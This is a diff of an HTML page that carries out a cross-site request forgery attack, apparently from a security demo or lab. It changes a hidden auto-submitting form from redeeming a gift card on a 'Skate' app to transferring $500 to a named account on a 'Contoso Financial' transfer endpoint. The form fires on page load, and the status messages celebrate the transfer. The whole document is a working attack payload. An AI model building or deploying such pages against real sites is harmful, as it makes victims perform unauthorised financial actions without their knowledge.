@@ -12,8 +12,9 @@
     <br />
     <br />
     <br />
-    <form action="http://shred-95952-25vt7gvfwbimahhb.northcentralus.cloudapp.azure.com/Skate/doRedeemGiftCard.action" method="POST">
-      <input type="hidden" name="code" value="eyJpZCI6MTAzfQ==" />
+    <form action="http://contosofinancial-135715-devantmo0m1t6acz.eastus.cloudapp.azure.com/ContosoFinancial/doTransfer.action" method="POST">
+      <input type="hidden" name="destId" value="83247649" />
+      <input type="hidden" name="amount" value="500" />
     </form>
   </body>
 
@@ -21,11 +22,11 @@
     $("#status").text("Loading");
 
     $(document).ready(async function() {
-      $("#status").text("CSRF redeeming evil gift card...");
+      $("#status").text("CSRF transferring money to Louis...");
 
       document.forms[0].submit();
 
-      $("#status").text("CSRF done! You've just redeemed a negative balance gift card on Skate!");
+      $("#status").text("CSRF done! You've just transferred $500 to Louis on Contoso Financial!");
     });
   </script>
 </html>
